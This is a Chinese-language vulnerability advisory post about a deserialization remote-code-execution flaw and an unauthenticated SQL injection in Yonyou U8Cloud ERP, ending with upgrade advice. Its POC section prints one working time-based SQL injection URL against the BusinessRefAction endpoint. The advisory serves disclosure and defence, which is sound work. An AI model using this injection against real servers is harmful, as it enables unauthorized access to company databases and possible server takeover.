#  漏洞预警 | 用友U8Cloud反序列化和SQL注入漏洞   
浅安  浅安安全   2024-08-17 08:00  
  
**0x00 漏洞编号**  
- # 暂无  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
用友U8Cloud是用友推出的新一代云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SXoaRemR3mxsuiciaUbPcWn9jsiaZ70u94EB6R9eOgsPln1PWpP3MSljJmZEwZYep2iakwjxN7DsbXlfg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**0x03 漏洞详情**  
###   
###   
  
**漏洞类型：**  
反序列化  
  
**影响：**  
执行任意命令  
  
**简述：**  
用友U8Cloud系统的CacheInvokeServlet接口存在反序列化漏洞，攻击者可通过该漏洞执行任意命令，进而接管整个服务器。  
  
**漏洞类型：**  
SQL注入  
  
**影响：**  
获取敏感信息  
  
**简述：**  
用友U8Cloud的BusinessRefAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。  
###   
  
**0x04 影响版本**  
- 用友U8Cloud  
  
**0x05****POC**  
  
**反序列化**  
  
**用友U8 Cloud 反序列化 CacheInvokeServlet RCE**  
  
**SQL注入**  
```
{{BaseURL}}/service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:5%27--
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.yonyou.com/  
  
  
  
